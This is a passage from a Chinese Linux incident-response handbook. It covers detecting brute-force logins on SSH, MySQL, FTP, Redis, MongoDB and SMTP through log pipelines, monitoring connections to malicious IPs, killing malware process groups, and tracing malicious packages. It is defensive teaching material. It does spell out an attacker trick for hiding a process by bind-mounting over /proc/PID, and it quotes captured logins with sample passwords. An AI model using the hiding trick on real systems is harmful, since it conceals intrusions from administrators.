 - `who -a`
 - `w`
 - `last -p now`
 - `sudo netstat -tnpa | grep 'ESTABLISHED.*sshd'`
 - `pgrep -af sshd`
 - `echo $SSH_CONNECTION`
 - `ss | grep ssh`

 - 查看ssh日志信息

 https://blog.csdn.net/supertor/article/details/84334710

 - Ubuntu

`/var/log/auth.log`

 - Centos

`/var/log/secure`

 这两个文件关于SSH的内容基本一致，所以此处以 Ubuntu的日志 `/var/log/auth.log` 为例，如果是Centos直接替换文件名就行

 - 查找登录成功的日志

`cat /var/log/auth.log | grep "Accept"`

 - 正常退出的日志

`cat /var/log/auth.log | grep "pam_unix(sshd:session): session closed"`

 - 登录密码错误的日志

 - 连续输入错误密码

 - 暴力破解

如果短时间内存在大量的如下失败请求，可能被暴力破解攻击了

 `pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.197.1  user=root

Apr 16 01:44:20 helper sshd[2167]: Failed password for root from 192.168.197.1 port 58371 ssh2

```

 - 查看登录失败的日志

`cat /var/log/auth.log | grep "Failed password for"  | more`

但是，服务器跑了这么久，有一些错误登录很正常，所以需要按照事件时间和用户来进行分辨

 - 统计登录失败的用户名以及次数

这里直接使用bypass总结的

 `grep "Failed password" /var/log/auth.log|perl -e 'while($_=<>){ /for(.*?)from/; print "$1\n";}'|sort|uniq -c|sort -nr

```

可以看到，其中有一项为 invaild user www ，这样的提示说明www这个用户不存在，但是有人使用了这个用户进行了登录

 - 统计暴力破解的登录者（IP）

根据上面的操作，已经确定sshd，helper，root，www这几个用户可能异常，我们挨个查看一下爆破IP

登录密码错误的用户存在的情况

单个用户以 root 为例

 `cat /var/log/auth.log | grep "Failed password for" | grep "root" | grep -Po '(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3}' |sort|uniq -c|sort -nr

```

也可以通过列来进行定位

 `cat /var/log/auth.log | grep "Failed password for" | grep "root" | cut -d " " -f 11 |sort -nr|uniq -c

```
 Rocky Linux 9 中 -f 11 应该改为 -f 13

如果你觉得上一部查出来的都是暴力破解或者说异常的，可以使用如下命令批量查询出来

 `cat /var/log/auth.log | grep "Failed password for" | cut -d " " -f 9 | sort -nr | uniq|grep -v "invalid"| while read line;do echo [$line];cat /var/log/auth.log | grep "Failed password for" | grep $line | grep -Po '(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3} '|sort|uniq -c |sort -nr; done

```

Rocky Linux / Centos 中应该为

 `cat /var/log/secure | grep "Failed password for" | grep -v "invalid" | cut -d " " -f 10 | sort -nr | uniq| while read line;do echo [$line];cat /var/log/secure | grep "Failed password for" | grep $line | grep -Po '(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3} '|sort|uniq -c |sort -nr; done

```

当然了，如果你觉得某一个用户的错误次数很少，是正常的，可以在命令中使用 grep -v "user" 的方式来进行，这里假如我们认为root用户的错误登录是正常的，所以不希望在结果中看到root的显示，可以使用如下命令：

 `cat /var/log/auth.log | grep "Failed password for" | cut -d " " -f 9 | sort -nr | uniq|grep -v "invalid\|root"| while read line;do echo [$line];cat /var/log/auth.log | grep "Failed password for" | grep $line | grep -Po '(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3} ' |sort|uniq -c| sort -nr; done

```

这样root的结果就不显示了，如果想不显示多个用户，继续添加  `\|user` 就可以了

登录密码错误的用户不存在的情况

首先查看这些不存在的用户名以及错误登录的次数

 `cat /var/log/auth.log | grep "Failed password for"| grep "invalid" | cut -d " " -f 11 | sort | uniq -c | sort -nr

```

查看这些用户的登录尝试IP以及次数

单用户 test来举例

 `cat /var/log/auth.log | grep "Failed password for" | grep "test" | grep -Po '(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3}' |sort|uniq -c|sort -nr

```

查询全部的不存在用户的登录IP以及次数

 `cat /var/log/auth.log | grep "Failed password for" | grep "invalid"| cut -d " " -f 11 | sort -nr | uniq| while read line;do echo [$line];cat /var/log/auth.log | grep "Failed password for" | grep $line | grep -Po '(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3} '|sort|uniq -c |sort -nr;done

```

当然，还是可以排除一个或者几个用户，这里排除 www和 test 用户

 `cat /var/log/auth.log | grep "Failed password for" | grep "invalid" | grep -v "www\|test"| cut -d " " -f 11 | sort -nr | uniq| while read line;do echo [$line];cat /var/log/auth.log | grep "Failed password for" | grep $line | grep -Po '(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3} '|sort|uniq -c |sort -nr;done

```

 - SSH加固

 - 升级SSH版本至少为 7.7版本以上，7.7及以下版本存在SSH用户名枚举
 - 加强口令复杂程度
 - 禁止root用户登录，可以通过其他用户su到root
 - 安装 fail2ban 来进行防御

### 0x03 Mysql 暴力破解

Mysql 默认安装会保留登录日志，在 Ubuntu 上默认位置为 `/var/log/mysql/error.log`

 - 查看登录错误的用户名

 `cat /var/log/mysql/error.log | grep "Access denied for user"  | grep "using password: YES" | awk -F "'" '{print $2}' | sort | uniq -c | sort -nr`

 - 查看登录错误用户名的登录IP以及次数

 `cat /var/log/mysql/error.log | grep "Access denied for user"  | grep "using password: YES" | awk -F "'" '{print $2}' | sort| uniq | while read line;do echo $line;cat /var/log/mysql/error.log | grep "Access denied for user" | grep "using password" | awk -F "'" '{print $4}' | sort | uniq -c | sort -nr; done`

### 0x04 FTP 暴力破解

ftp服务端以 vsftpd为例，其他服务端思路类似，日志记录可能不同

vsftpd配置过程

 - 网络连接

可以看到，现在存在一条已经建立的连接，从 192.168.197.101的56806端口连接到192.168.197.129的21端口

如果存在暴力破解，网络连接情况如下：

有大量的ESTABLISHED状态和TIME_WAIT状态的网络连接

 - 当前的ftp会话

 ftp和ssh不一样，ftp的会话一般很难捕捉到，除非此时此刻正在使用

 - last -w -x

从返回结果可以看到，有大概5次ftp连接，有一个会话依旧在线，依旧在线的连接pid为 21990

 - ftpwho

也可以使用ftpwho来进行查看，这个工具默认没有安装在ubuntu中，需要 `apt install ftpwho`

接下来我们看看日志

 在ubuntu上，vsftpd的日志位于 `/var/log/vsftpd.log`

 - 正常登录的日志

 - 下载文件

 - 错误登录的日志 （不分账号是否存在）

 - 暴力破解的日志

看来拒绝服务这事，服务器也是拒绝的

 - 登录失败的账号地址

 `cat /var/log/vsftpd.log | grep FAIL | cut -d "[" -f 3 | cut -d "]" -f 1 | sort | uniq -c | sort -nr`

 - 查看登录失败的用户的登录IP

 `cat /var/log/vsftpd.log | grep FAIL | cut -d "[" -f 3 | cut -d "]" -f 1 | sort | uniq | while read line;do echo $line;cat /var/log/vsftpd.log | grep  $line | cut -d ":" -f 7 | cut -d '"' -f 1 | sort | uniq -c | sort -nr; done`

 - FTP服务加固
 - 禁用 anonymous 和 ftp 两个账号
 - 使用 SSL 加密 FTP
 - 安装 fail2ban 来进行防御

### 0x05 Redis 未授权访问&amp;暴力破解

未授权访问漏洞，洞如其名，因为不需要授权，所以可能会导致一顿恶意操作

没啥说的，直接连接就好

加固方案

 - 设置密码,并且密码足够复杂

 - 将redis.conf 中的 requirepass 前的注释打开，并且设置一个复杂密码

 - 按照需求进行收口，如果仅仅是本机使用，可以绑定IP为 127.0.0.1

修改配置文件后需要重启redis生效

redis 默认是不记录日志的，可以通过配置 logfile 来进行设置日志记录 ,默认的loglevel为notice

redis3.2版本后新增protected-mode配置，默认是yes，即开启。设置外部网络连接redis服务，设置方式如下：

1、关闭protected-mode模式，此时外部网络可以直接访问

2、开启protected-mode保护模式，需配置bind ip或者设置访问密码

Redis 日志分析

 - 未授权登录日志

 loglevel = notice

主机未授权登录 --> 执行info --> 执行set hello wrold --> exit退出

loglevel = verbose

主机未授权登录 --> 执行info --> 执行set hello wrold --> exit退出

loglevel = debug

主机未授权登录 --> 执行info --> 执行set hello wrold --> exit退出

综上可以看出：

 - 只有手动设置logfile才能保存日志，默认不设置
 - 默认的日志级别notice是不会记录登录、执行指令、退出的。
 - loglevel设置为 verbose或者debug才会记录登录主机
 - 执行的指令 info ，set 等即使 loglevel 是 debug 级别也不会记录，但是会记录我们设置了多少个key，具体key名称以及内容不会记录

 如果想临时记录一下详细日志可以使用 MONITOR

使用我们的主机登录redis，之后执行 MONITOR 指令，之后就可以看到其他主机连接redis服务器后的详细操作了

redis 暴力破解

 - loglevel = notice

 - loglevel = verbose

 - loglevel=debug

综上来看，我们只有把 loglevel 设置为 verbose 或者 debug 的时候才可以记录到暴力破解

也就是说默认情况下不看网络连接根本无法观察到暴力破解，当然了，安全设备如edr可能是会监测的

20210419 现在的问题是 redis 对于认证成功和失败日志都是一样的，无法区分攻击和正常登录,需要后期再讨论

20210513 redis 目前无法通过日志来判断是否被暴力破解

暴力破解的

ubuntu 16.04 安装 4.0.9 版本的 redis

 - 配置文件默认  `/etc/redis/redis.conf`
 - 默认开启 protect mode ,绑定IP为 127.0.0.1
 - 默认记录日志 `/var/log/redis/redis-server.log`

我们关闭protected-mode ，设置 bind 0.0.0.0 ,进行正常访问和错误登录尝试，设置 requirepass 密码

日志等级verbose --> 错误密码登录尝试 --> 退出 --> 正确密码登录 --> 执行 info --> 执行 set hello world --> 退出

日志等级 debug --> 错误密码登录尝试 --> 退出 --> 正确密码登录 --> 执行 info --> 执行 set hello world --> 退出

我擦，放弃放弃，登录成功失败一个样

### 0x06 Mongodb 暴力破解

Mongodb 曾经也出现过未授权访问漏洞，具体可以参照Freebuf 上的文章 https://www.freebuf.com/vuls/212799.html

 `3.0之前版本的MongoDB,默认监听在0.0.0.0，3.0及之后版本默认监听在127.0.0.1。
3.0之前版本，如未添加用户管理员账号及数据库账号，使用--auth参数启动时，在本地通过127.0.0.1仍可无需账号密码登录访问数据库，远程访问则提示需认证；
3.0及之后版本，使用--auth参数启动后，无账号则本地和远程均无任何数据库访问权限。

```
 为了分析日志，我们把监听设置为 0.0.0.0 ，使用另一台服务器来进行连接

在 Ubuntu 上默认无需密码验证（可以添加启动参数来设置密码验证），默认配置文件位置为 `/etc/mongodb.conf` 默认的的日志位置为 `/var/log/mongodb/mongodb.log` , 3.0 以上版本默认 band_ip 为 127.0.0.1 ，我们修改一下以便实验

这样 Centos 就可以连接上了

日志分析

 - 正常启动，无访问

 - 无密码正常访问 -- > 执行 show dbs --> exit 退出

mongodb 有一点非常好，它会记录客户端的系统 banner 信息，上图就可以清晰看到 Centos 7.8 的客户端连接了mongodb，但是遗憾的是默认并没有记录客户端的具体操作，当然了，遗憾这两个字是针对安全人员来说的，对于应用正常使用，日志存储，日志可读性，保密性等角度来说，这么做是有道理的。

当然了，mongodb 也提供了详细日志的选项，我们尝试打开

我们看一下开启了 verbose 之后

 - 无密码正常访问 -- > 执行 show dbs --> exit 退出

可以看到，即使是设置 verbose 后还是不会记录具体的操作，但确实是整个过程更详细了

日志未设置 verbose

 - 有密码正常访问 --> 执行 show dbs --> 退出

这里需要注意的是，连接到数据库后，不执行任何操作就会产生下面这条日志

 `Unauthorized: not authorized on admin to execute command { replSetGetStatus: 1.0, forShell: 1.0, $db: "admin" }

```
 也就是我标记为连接后尚未认证的这条

 - 有密码 --> 使用不存在用户登录 --> 存在用户错误密码登录尝试 --> 正确用户名密码登录--> show dbs --> 退出

 - 暴力破解

可以看到，存在大量的failed 的日志，这就好办了

日志设置 verbose

直接暴力破解就好

可以看到，虽然更加详细了，但是关键字 failed 还是在的，可以以此来作为筛选依据

日志分析

不同系统以及安装环境日志目录可能不同，这里使用 ubuntu默认的目录 `/var/log/mongodb/mongodb.log`

 - 存在的账户的登录失败情况

 `cat /var/log/mongodb/mongodb.log | grep -v "UserNotFound"|grep failed | awk -F " " '{print $9}' | sort|uniq -c|sort -nr`

 - 存在的某个账户 (以root为例) 登录失败的来源IP以及次数

 `cat /var/log/mongodb/mongodb.log | grep -v "UserNotFound"|grep failed| grep root | awk -F " " '{print $14}' | cut -d ":" -f 1 | sort | uniq -c | sort -nr`

 - 查看所有存在的账户登录失败的来源以及次数

 `cat /var/log/mongodb/mongodb.log | grep -v "UserNotFound"|grep failed | awk -F " " '{print $9}' |sort | uniq | while read line;do echo $line;cat /var/log/mongodb/mongodb.log |grep -v "UserNotFound" | grep failed | grep $line | awk -F " " '{print $14}' | cut -d ":" -f 1 | sort | uniq -c | sort -nr; done`

 - 不存在的账户的登录尝试

 `cat /var/log/mongodb/mongodb.log | grep "UserNotFound"|grep failed | awk -F " " '{print $9}' | sort|uniq -c|sort -nr`

 - 不存在账户的登录IP以及次数

 `cat /var/log/mongodb/mongodb.log | grep "UserNotFound"|grep failed | awk -F " " '{print $9}' |sort | uniq | while read line;do echo $line;cat /var/log/mongodb/mongodb.log |grep "UserNotFound" | grep failed | grep $line | awk -F " " '{print $14}' | cut -d ":" -f 1 | sort | uniq -c | sort -nr; done`

### 0x07 smtp 暴力破解

邮件服务这块一直是企业突破口的重灾区，主要涉及三个协议 SMTP, POP3, IMAP

简单来说，SMTP负责发，POP3、IMAP负责收，POP3协议客户端收到邮件，服务器端就会将其删除，除非有特殊的配置，可能在一些方面有其用途。IMAP则弥补了这一缺陷，客户端该收收，服务端还给你保存着，同时你在客户端的各种配置操作都会在服务器上进行同步

按照其用途来说，三种协议都有身份认证的过程，对于这种出现较早的协议，设计之初都不会有双因素认证这种东西，毕竟是安全人员出现以后，网络才变得不安全了，所以出现了现在各种协议的补充，对于三种协议的具体数据包分析可以看下面的文章

https://wooyun.js.org/drops/Wireshark%E9%BB%91%E5%AE%A2%E5%8F%91%E7%8E%B0%E4%B9%8B%E6%97%85%EF%BC%884%EF%BC%89%E2%80%94%E2%80%94%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.html

这里直接将文章中的内容引用到这里

 - POP3

 `+OK Microsoft Exchange Server 2003 POP3 .......... 6.5.6944.0 (a-ba21a05129e24.test.org) ........   //服务器准备就绪
CAPA   //用于取得此服务器的功能选项清单
+OK Capability list follows
TOP
USER
PIPELINING
EXPIRE NEVER
UIDL
.
USER jufeng001@test.org    //与 POP3 Server 送出帐户名
+OK
PASS 1qaz@WSX    //与 POP3 Server 送出密码
+OK User successfully logged on.   //认证成功
STAT
+OK 14 21568
QUIT
+OK Microsoft Exchange Server 2003 POP3 .......... 6.5.6944.0 ..........

```

 - smtp

 `220 a-ba21a05129e24.test.org Microsoft ESMTP MAIL Service, Version: 6.0.3790.3959 ready at  Thu, 6 Aug 2015 11:10:17 +0800  //服务就绪
EHLO Mr.RightPC //主机名
250-a-ba21a05129e24.test.org Hello [192.1.14.228]
……
250 OK
AUTH LOGIN  //认证开始
334 VXNlcm5hbWU6  // Username:
anVmZW5nMDAxQHRlc3Qub3Jn  //输入用户名的base64编码
334 UGFzc3dvcmQ6  // Password:
MXFhekBXU1g=   //输入密码的base64编码
235 2.7.0 Authentication successful.    //认证成功

```

 - IMAP

 `* OK Microsoft Exchange Server 2003 IMAP4rev1 .......... 6.5.6944.0 (a-ba21a05129e24.test.org) ........     //IMAP服务就绪
bf8p CAPABILITY
* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN
bf8p OK CAPABILITY completed.
s3yg LOGIN "jufeng002" "1qaz@WSX"        //输入用户名:jufeng002，密码:1qaz@WSX
s3yg OK LOGIN completed.     //认证成功

```
 Linux 常用的邮件服务器为  Postfix , ubuntu 上默认日志位置 /var/log/mail.log

SMTP认证失败的IP统计

`cat /var/log/mail.log | grep "authentication failed" | grep -Po '(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3}' |sort|uniq -c|sort -nr`

Postfix 日志能够提取的内容似乎不多，也就这些

### 0x08 善后阶段

直接查看善后阶段即可

### 0x09 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 确认攻击信息准确性

安全设备、人、上级/行业/监管单位的通报都不见得是准确的，做二次研判是必要的，能够帮我应急响应人员确定整体排查思路

### 询问历史被攻击情况、历史通报、历史误报

历史攻击可能会留下攻击遗产，成为未来新一轮攻击事件的发起点，询问清楚历史被攻击、被通报情况，向当事人或负责人了解清楚事件性质、处理过程、处理结果，这可能会在完全理不清攻击路径的时候帮你一把

应急响应人员大概率是没有被攻击单位运维、安全等人员熟悉他们的系统的，所以历史误报很重要，例如修改了数据库密码等问题就很容易有历史误报，建议面对暴力破解事件时打听一下历史误报情况

### 暴力破解类型

暴力破解攻击主要针对

 - ssh
 - mysql
 - ftp
 - redis
 - mongodb
 - smtp

## 10. 非持续性事件

> 原文：https://books.noptrace.com/linux/9.%E9%9D%9E%E6%8C%81%E7%BB%AD%E6%80%A7%E4%BA%8B%E4%BB%B6/

### 0x00 简介

持续性的挖矿、远控后门等可以通过直接排查发现，但是在实际工作中，很多恶意行为（访问恶意域名、连接恶意IP）只集中出现了几次，无法直接通过网络连接找到恶意进程及文件或者有些恶意程序处置结束后，无法确定是否已经清理完整

可以通过短时间/长时间网络监控来解决

### 0x01 确定目标域名或IP

如果目标域名或者IP是某一知名组织的，可以将该组织或者种类病毒的域名和IP都收集进行监控

### 0x02 修改域名解析记录

修改恶意域名的解析记录目的主要有两个：

 - 阻断控制，防止二次伤害
 - 得到固定的IP解析记录，防止攻击者把域名下架或者改变解析到的IP

 修改域名解析记录有两个途径：

 - 在内网DNS服务器中集中修改（如果内网有DNS服务器）
 - 修改 hosts 文件 (推荐)

 以恶意域名 `du.testjj.com` 为例

通过修改 `/etc/hosts` 将 `du.testjj.com` 解析IP修改为 `123.123.123.123`

### 0x03 设置监控程序

很多客户不允许在服务器上安装监控程序，但是对于可审计的脚本倒是可以在审计后执行，因此这里主要以脚本为主

Linux_Audit_Nop.sh

 `#!/bin/bash

while true
do
    sleep 0.1
    pids=$(netstat -pantu | grep 123.123.123.123 | awk -F "/" '{print $1}' | awk -F " " '{print $NF}' | sort | uniq)
    for one_pid in $pids
    do
        if [ $one_pid == "-" ]; then
            continue
        fi

        echo "" >> $(pwd)/Audit_results.txt
        echo "[ lsof -p $one_pid ]" >> $(pwd)/Audit_results.txt
        lsof -p $one_pid >> $(pwd)/Audit_results.txt
        echo "" >> $(pwd)/Audit_results.txt
        echo "[ cat /proc/$one_pid/maps ]" >> $(pwd)/Audit_results.txt
        cat /proc/$one_pid/maps >> $(pwd)/Audit_results.txt
        echo "" >> $(pwd)/Audit_results.txt
        echo "[ ls -al /proc/$one_pid/exe ]" >> $(pwd)/Audit_results.txt
        ls -al /proc/$one_pid/exe >> $(pwd)/Audit_results.txt
    done
    if [ -f "$(pwd)/Audit_results.txt" ]; then
        echo "Found it !"
        exit
    fi
done

```
 除了上述脚本以外，再推荐两款比较优秀的程序

 - sysmon for linux
 - auditd

 sysmon for linux 原本是微软为 Windows 开发的监控程序，21年的时候做了 Linux 开源版

https://github.com/Sysinternals/SysmonForLinux

https://github.com/OpenSecureCo/Demos/blob/main/sysmonforlinux

auditd 集成在 Ubuntu 的软件库中，可以直接安装

https://linux.die.net/man/8/auditd

### 0x04 等待恶意程序执行

### 0x05 确定程序运行时间

- 查看程序运行时间

 - `ps -w -eo pid,lstart,etime,cmd | grep <pid>`

表示 `1292` 这个进程是在 `2022`年`4`月`28`日`13:32:20` 被创建的，已经运行了`30分零2秒`，具体执行的命令行为 `/usr/sbin/sshd -D`

 - 与找到的恶意文件创建时间进行对比

 - `stat xxx.sh`

 - `ls -al xxx.sh`

 这个部分更多是为了验证发现的文件是否为当前程序的恶意文件，增加这个对比，可能会发现一些之前没有发现的蛛丝马迹

### 0x06 处理异常进程

- 恶意文件样本采样

 - scp
 - `scp -P 4588 remote@www.target.com:/usr/local/aaa /home/admin`
 - -P 指定SSH端口
 - 从远程服务器将aaa下载到本地的 /home/admin

 - finalshell、xshell等集成工具

 - python、php等程序起http服务
 - nc

 - 病毒在线分析

 - 微步云沙箱
 - Virustotal
 - virscan
 - 哈勃
 - jotti
 - scanvir
 - 魔盾
 - HYBRID
 - 奇安信情报沙箱
 - 大圣云沙箱检测系统
 - YOMI
 - 360沙箱云
 - 安恒云沙箱
 - 绿盟威胁分析中心

 - 寻找病毒分析报告

 - 深信服EDR团队安全情报分析
 - 火绒安全最新资讯
 - 安全客
 - Freebuf
 - 微步在线 X 情报社区
 - 安天
 - ...

 - 进程查杀

有些进程会起子进程，可以使用如下命令查看

 - `ps -w ajfx`
 - `systemctl status`

 如果无子进程，直接使用

 - `kill -9 pid` 这样会直接杀死指定进程，但是，由这个进程产生的子进程不会被杀死

 如果进程起子进程，需要使用如下命令

 - `kill -9 -pid` 注意，这里pid前有个减号，表示杀掉这个进程组

需要注意的是， `kill -9 -PGID` 配合 `sudo` 使用时，需要将命令修改为以下格式

 `sudo kill -9 -- -PGID

```
 也可以使用 `pkill` 来完成

 `sudo pkill -g PGID   # 进程组前没有横杠

```

 进程组ID & 会话ID  平时我们关注的更多是PID和PPID，对于PGID，SID接触较少，简单介绍一下  使用 `ps -w ajfx` 可以看到具体的PPID、PID、PGID、SID 信息  程序运行起来后，会产生一个主进程，并且分配一个进程ID（pid），如果在运行期间起其他进程，那么这个其他进程就是子进程，同时分配相应的进程ID，并设置其PPID的值为父进程的pid 此时呢，父进程和所有生成的子进程会组合成一个进程组，并且分配一个进程组ID 那什么叫做会话ID，其实也很容易理解，我们通过ssh 链接到服务器，就会获取一个会话，分配一个会话ID，此时我们起的进程的会话ID都是一样的 所以，如果挖矿程序有调用子进程，那么就需要以进程组为单位杀死！

 - 守护进程(daemon)

挖矿病毒为了保障挖矿程序的运行，通常会为挖矿程序设置守护进程，杀死守护进程与杀死普通进程并无区别，更详细的内容已经总结到 Linux守护进程 | 应急响应 这篇文章

 - 线程查杀

很多木马病毒将恶意代码执行做到了线程级别，也就是说附到了现有正常业务的进程中，做一个线程,目前查杀一个进程中的线程风险比较大，极可能会把进程搞崩掉，需要与客户确认好再进行，杀死线程的方法和杀死进程一样，因为在Linux中线程的概念就是轻量级进程

 - 根据pid查看由进程起的线程
 - `ps -w -T -p pid`
 - `ps -w -aLf pid`      其中SPID就是线程ID，而CMD栏则显示了线程名称
 - `top -H -p pid` -H 选项可以显示线程
 - htop (默认未安装)，可以较为全面的展示线程
 - `pstree -agplU` 推荐，非常全面展示进程与线程间的关系
 - 可以在后面直接加 pid 的值，例如 `pstree -agplU 709` ，查看指定 pid 的进程与线程的关系

 - 查看全部的线程
 - `ps -w -eLFa`

### 0x07 删除恶意文件

通过进程pid以及/proc/ ,我们已经定位到了文件的具体位置，接下来就是删除恶意文件

 - 查看文件占用      `lsof eval.sh`     如果存在进程占用，那么占用进程也可能是恶意进程，需要按照之前的步骤进行查看

 - a 和 i 属性导致文件不可删除

 - a属性 文件只能增加内容，不能修改之前的文件，不能删除文件
 - i属性 内容不能改变，文件不能删除      可以使用 `chattr -a` 和 `chattr -i`

 具体可以参考 https://www.cnblogs.com/kzang/articles/2673790.html

 - 奇怪文件名导致文件不可删除

从windows向linux传输的文件或者攻击者恶意制造的文件，很多会有文件名乱码，无法直接通过乱码的文件名进行删除，可以使用inode来确定文件名，之后删除

 - 使用 inode 进行删除

 - 查看inode

 - `ls -li eval.sh`

 `john@john:~/temp$ ls -li evil.sh
12327526 -rw-r--r-- 1 john john 0 3月   7 10:21 evil.sh
john@john:~/temp$

```

 - 删除文件

 - `find ./* -inum 12327526 -delete`
 - `find ./ -inum 12327526 -exec rm {} \;`
 - `find ./* -inum 12327526 -exec rm -i {} \;` (会有一步确认是否删除)
 - `find ./* -inum 12327526 -exec rm -f {} \;`(不进行确认直接强制删除)
 - `find ./* -inum 12327526 |xargs rm -f`
 - `rm `find ./* -inum 12327526``

 参考文章 https://www.cnblogs.com/starry-skys/p/12970463.html https://www.cnblogs.com/tssc/p/7574432.html

 - 目录挂载导致无法删除

当目录中没有文件但是依旧无法删除的时候，显示 `Device or resource busy`

使用lsof 进行查看，又发现没有资源占用，此时要考虑可能目录存在挂载点

此时需要先将挂载取消，之后再删除该文件夹

查看挂载情况

 `sudo lsblk -a

```

取消挂载

 `sudo umount /dev/sdb1

```
 /dev/sdb1 是演示电脑的情况，需要按照实际情况更改

这样就成功删除了

### 0x08 善后阶段

直接查看善后阶段即可，主要为定损以及针对性排查处理，目的是解决潜在的受害服务器

### 0x09 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

## 11. 恶意软件包供应链攻

> 原文：https://books.noptrace.com/linux/10.%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%8C%85%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB/

### 0x00 梳理现场情况

### 0x01 通过 pid 确定具体文件

- 根据pid获取程序的详细信息

 - `lsof -p pid`
 - `pwdx pid` 获取该pid的进程启动的时候的目录,并不一定是恶意文件所在的路径，只是启动恶意文件的路径
 - `systemctl status pid` 获取这个进程的status信息
 - `cat /proc/pid/maps`
 - `ls -al /proc/pid/exe`

 有些时候无法通过ps，top等命令根据pid进行查询，可能是因为攻击者将/proc/pid/ 进行了隐藏，可以通过以下方式进行隐藏(ubuntu测试成功，centos测试失败)

 - mkdir .hidden
 - mount -o bind .hidden /proc/PID     这种情况可以使用 `cat /proc/$$/mountinfo` 来查看挂载信息

 - 根据pid查看由进程起的线程

 - `ps -w H -T -p pid`
 - `ps -w -Lf pid`      其中SPID就是线程ID，而CMD栏则显示了线程名称
 - `top -H -p pid` -H 选项可以显示线程
 - htop (默认未安装)，可以较为全面的展示线程
 - `pstree -agplU` 推荐，非常全面展示进程与线程间的关系
 - 可以在后面直接加 pid 的值，例如 `pstree -agplU 709` ，查看指定 pid 的进程与线程的关系

### 0x02 确定恶意文件所属软件包

【Ubuntu】

 `dpkg -S evil.sh

```

【Rocky Linux】

 `yum whatprovides evil.sh

```

### 0x03 确定恶意软件包相关文件

【Ubuntu】

 `dpkg -L <package-name>

```

【Rocky Linux】

 `rpm -ql <package-name>

```

### 0x04 打包恶意软件所有相关文件

【Ubuntu】

 `mkdir package_details; dpkg -L <package-name> | xargs -I ford sh -c 'if [ -f ford ]; then cp ford ./package_details/ ; echo "`md5sum ford`ford" ;fi' > package_details/md5.txt; tar -cvf package_details_`date +%s`.tar ./package_details; rm -r ./package_details

```

会在当前目录下生成 tar 包，其中包含了该恶意软件的所有文件以及 md5

【Rocky Linux】

 `mkdir package_details; rpm -ql <package-name> | xargs -I ford sh -c 'if [ -f ford ]; then cp ford ./package_details/ ; echo "`md5sum ford`ford" ;fi' > package_details/md5.txt; tar -cvf package_details_`date +%s`.tar ./package_details; rm -rf ./package_details

```

### 0x05 确定程序运行时间

- 查看程序运行时间

 - `ps -w -eo pid,lstart,etime,cmd | grep <pid>`

表示 `1292` 这个进程是在 `2022`年`4`月`28`日`13:32:20` 被创建的，已经运行了`30分零2秒`，具体执行的命令行为 `/usr/sbin/sshd -D`

 - 与找到的恶意文件创建时间进行对比

 - `stat xxx.sh`

 - `ls -al xxx.sh`

 这个部分更多是为了验证发现的文件是否为当前程序的恶意文件，增加这个对比，可能会发现一些之前没有发现的蛛丝马迹

例如根据事件推断软件包安装路径、需求等

### 0x06 分析恶意软件包并处理异常进程

- 病毒在线分析

 - PCHunter
 - Virustotal
 - 哈勃
 - jotti
 - scanvir
 - 魔盾
 - 微步云沙箱
 - HYBRID
 - 奇安信沙箱

 - 寻找病毒分析报告

 - 深信服安全应急响应以及EDR知识赋能平台
 - 深信服EDR团队安全情报分析
 - 深信服安全中心
 - 火绒安全最新资讯
 - 安全客
 - Freebuf
 - ...

 - 进程查杀

有些进程会起子进程，可以使用如下命令查看

 - `ps -w ajfx`
 - `systemctl status`

 如果无子进程，直接使用

 - `kill -9 pid` 这样会直接杀死指定进程，但是，由这个进程产生的子进程不会被杀死

 如果进程起子进程，需要使用一下命令

 - `kill -9 -pid` 注意，这里pid前有个减号，表示杀掉这个进程组

需要注意的是， `kill -9 -PGID` 配合 `sudo` 使用时，需要将命令修改为以下格式

 `sudo kill -9 -- -PGID

```
 也可以使用 `pkill` 来完成

 `sudo pkill -g PGID   # 进程组前没有横杠

```

 进程组ID & 会话ID  平时我们关注的更多是PID和PPID，对于PGID，SID接触较少，简单介绍一下  使用 `ps -w ajfx` 可以看到具体的PPID、PID、PGID、SID 信息  程序运行起来后，会产生一个主线程，并且分配一个进程ID（pid），如果在运行期间起其他进程，那么这个其他进程就是子进程，同时分配相应的进程ID，并设置其PPID的值为父进程的pid 此时呢，父进程和所有生成的子进程会组合成一个进程组，并且分配一个进程组ID 那什么叫做会话ID，其实也很容易理解，我们通过ssh 链接到服务器，就会获取一个会话，分配一个会话ID，此时我们起的进程的会话ID都是一样的 所以，如果挖矿程序有调用子进程，那么就需要以进程组为单位杀死！

 - 守护进程(daemon)

挖矿病毒为了保障挖矿程序的运行，通常会为挖矿程序设置守护进程，杀死守护进程与杀死普通进程并无区别，更详细的内容已经总结到 Linux守护进程 | 应急响应 这篇文章

 - 线程查杀

很多木马病毒将恶意代码执行做到了线程级别，也就是说附到了现有正常业务的进程中，做一个线程,目前无法单独查杀一个进程中的某个线程。

 - 根据pid查看由进程起的线程
 - `ps -w -T -p pid`
